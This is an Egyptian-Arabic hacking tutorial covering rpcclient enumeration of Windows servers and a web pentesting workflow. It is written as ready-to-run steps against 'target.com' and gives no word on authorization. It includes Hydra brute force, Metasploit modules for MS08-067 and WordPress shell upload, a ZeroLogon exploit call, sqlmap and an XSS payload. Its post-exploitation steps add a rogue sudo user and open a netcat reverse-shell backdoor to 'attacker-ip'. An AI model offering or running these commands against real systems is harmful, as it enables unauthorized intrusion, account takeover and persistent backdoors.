

# **🚀 1. يعني إيه `rpcclient`؟**

`rpcclient` هي أداة موجودة في **Linux** بتسمحلك تتصل بـ **سيرفر Windows** عن طريق **Remote Procedure Call (RPC)**، وده جزء من **SMB**.

### **🔍 طيب ليه ده مهم؟**

لأن **Windows Server** بيحتوي على معلومات زي:  
✅ **أسماء المستخدمين والمجموعات**  
✅ **الموارد المشتركة (Shared Files & Folders)**  
✅ **إعدادات السيكيورتي للجهاز**  
✅ **آخر تسجيل دخول لكل مستخدم**

لو السيرفر مش مأمن كويس، الأدوات دي ممكن تفضح معلومات قيمة، وتفتح لك طريق لاستغلال الثغرات!

🟢 **الخلاصة بالعامية المصرية:**  
`rpcclient` أداة تخليك تتجسس على سيرفر Windows وتجيب منه معلومات زي المستخدمين والمجلدات المشتركة، ولو السيرفر مش مأمن، ممكن تستغله!

---

# **🛠️ 2. الدخول على `rpcclient`**

#### ✅ **لو السيرفر يسمح بالدخول بدون باسورد:**

```bash
rpcclient -U "" -N target.com
```

🔹 `-U ""` → دخول بدون يوزر  
🔹 `-N` → بدون باسورد

#### ✅ **لو عندك يوزر وباسورد:**

```bash
rpcclient -U "admin" target.com
```

🔹 لو صح، هتاخد جلسة RPC وتقدر تستكشف السيرفر.

🟢 **الخلاصة بالعامية المصرية:**  
لو السيرفر سايب الدخول مفتوح، هتدخل بسهولة، ولو معاك بيانات يوزر، استخدمها في الدخول.

---
# كل الخطوات التاليه دي اعملها لو بعد الخطوه رقم 2 عمل كده


![Pasted image 20250310173759.png](attachments/Pasted image 20250310173759.png)

### **🔎 3. استخراج بيانات المستخدمين والمجموعات**

#### ✅ **جلب قائمة المستخدمين:**

```bash
enumdomusers
```

🔹 هيعرض كل اليوزرات في السيرفر.  
🔹 ممكن تلاقي **حسابات أدمن أو حسابات ضعيفة**.

#### ✅ **معرفة تفاصيل مستخدم معين:**

```bash
queryuser user_id
```

🔹 هتعرف بيانات المستخدم زي:

- **متى أنشئ؟**
- **آخر مرة سجل دخول؟**
- **متى تم تغيير كلمة المرور؟**

#### ✅ **عرض قائمة الجروبات:**

```bash
enumdomgroups
```

🔹 ممكن تلاقي **جروب فيه صلاحيات كبيرة**.

🟢 **الخلاصة بالعامية المصرية:**  
هتجيب كل اليوزرات والجروبات اللي على السيرفر، وممكن تعرف معلومات حساسة عن الحسابات اللي فيه.

---

### **📂 4. استكشاف الملفات والمجلدات المشتركة**

#### ✅ **عرض الـ Shared Folders والملفات المتاحة:**

```bash
netshareenum
```

🔹 ممكن تلاقي **ملفات حساسة** زي:  
✅ **Passwords.txt**  
✅ **Database backups**  
✅ **مجلدات فيها Scripts بتحتوي على كلمات مرور**

#### ✅ **معرفة تفاصيل عن مجلد معين:**

```bash
netsharegetinfo sharename
```

🟢 **الخلاصة بالعامية المصرية:**  
هتشوف لو فيه مجلدات وملفات مشتركة، ولو السيرفر مش مأمن كويس، ممكن تلاقي ملفات فيها معلومات سرية!

---

### **🔑 5. تجربة كسر كلمات المرور (Brute Force Attack)**

#### ✅ **تجربة تسجيل الدخول بحساب معين:**

```bash
rpcclient -U "admin" target.com
```

#### ✅ **استخدام Hydra لتخمين الباسوردات:**

```bash
hydra -L users.txt -P passwords.txt smb://target.com
```

🔹 `users.txt` → قائمة بأسماء المستخدمين  
🔹 `passwords.txt` → قائمة بكلمات المرور

🟢 **الخلاصة بالعامية المصرية:**  
لو جبنا يوزرات من السيرفر، ممكن نجرب نخمن الباسوردات ونكسر الدخول!

---

### **💀 6. استغلال ثغرات RPC**

#### ✅ **استغلال MS08-067 لاختراق Windows XP/2003**

```bash
msfconsole
use exploit/windows/smb/ms08_067_netapi
set RHOSTS target.com
set LHOST your-ip
exploit
```

🔹 لو نجح، هتاخد **جلسة Meterpreter** وتتحكم في السيرفر بالكامل!

#### ✅ **استغلال ZeroLogon (CVE-2020-1472)**

```bash
python3 zerologon_exploit.py target.com
```

🔹 لو السيرفر **Domain Controller**، ممكن تبقى **Administrator** في الشبكة كلها!

🟢 **الخلاصة بالعامية المصرية:**  
لو السيرفر فيه ثغرات، ممكن نستخدم **Metasploit** أو سكريبتات Python لاختراقه بالكامل! 🔥

---

## **🚀 خطوات عملية لـ Web Pentesting**

### **1️⃣ جمع المعلومات (Reconnaissance)**

✅ **استكشاف الـ Subdomains**

```bash
subfinder -d target.com
```

✅ **البحث عن صفحات مخفية:**

```bash
gobuster dir -u https://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

✅ **جلب معلومات DNS:**

```bash
dig target.com
```

✅ **البحث عن أخطاء في الكود (Open-Source Intelligence - OSINT)**

- البحث عن تسريبات في **GitHub**
- البحث عن الدومين في **Shodan**

```bash
shodan search target.com
```

---

### **2️⃣ فحص الثغرات (Scanning & Enumeration)**

✅ **البحث عن المنافذ المفتوحة:**

```bash
nmap -sV -sC -T4 target.com
```

✅ **فحص ثغرات الـ Web باستخدام Nikto:**

```bash
nikto -h https://target.com
```

✅ **البحث عن SQL Injection:**

```bash
sqlmap -u "https://target.com/login.php?id=1" --dbs
```

---

### **3️⃣ استغلال الثغرات (Exploitation)**

✅ **XSS Injection**

```html
<script>alert('Hacked!')</script>
```

✅ **رفع Shell عبر File Upload Bypass**

- رفع ملف **PHP Reverse Shell**
- الاتصال بالسيرفر باستخدام Netcat:

```bash
nc -lvnp 4444
```

✅ **اختراق باستخدام Metasploit**

```bash
msfconsole
use exploit/unix/webapp/wp_admin_shell_upload
set RHOSTS target.com
set USERNAME admin
set PASSWORD password123
exploit
```

---

### **4️⃣ الحصول على صلاحيات أعلى (Privilege Escalation)**

✅ **البحث عن كلمات مرور مخزنة:**

```bash
find / -name "*.config" 2>/dev/null
```

✅ **محاولة كسر كلمة مرور مستخدم Root:**

```bash
sudo -l
```

✅ **استغلال Kernel Exploits:**

```bash
searchsploit linux kernel privilege escalation
```

---

### **5️⃣ السيطرة الكاملة على السيرفر (Post-Exploitation)**

✅ **إضافة مستخدم جديد بصلاحيات Root:**

```bash
useradd -m -p $(openssl passwd -1 newpassword) hacker
usermod -aG sudo hacker
```

✅ **عمل Backdoor للاستمرار في التحكم:**

```bash
nc -e /bin/bash attacker-ip 4444
```

✅ **استخراج البيانات الحساسة:**

```bash
cat /etc/passwd
```

---

### **🚀 الخلاصة النهائية:**

1️⃣ **ابدأ بجمع المعلومات عن الموقع باستخدام `subfinder` و `gobuster`**  
2️⃣ **افحص المنافذ والثغرات باستخدام `nmap` و `sqlmap`**  
3️⃣ **حاول استغلال الثغرات باستخدام `Metasploit` أو تحميل Shell**  
4️⃣ **ابحث عن طرق للحصول على صلاحيات أعلى في السيرفر**  
5️⃣ **حافظ على التحكم في السيرفر باستخدام Backdoors**

🔥 **كده معاك دليل كامل لـ `rpcclient` + Web Pentesting!** 💀💻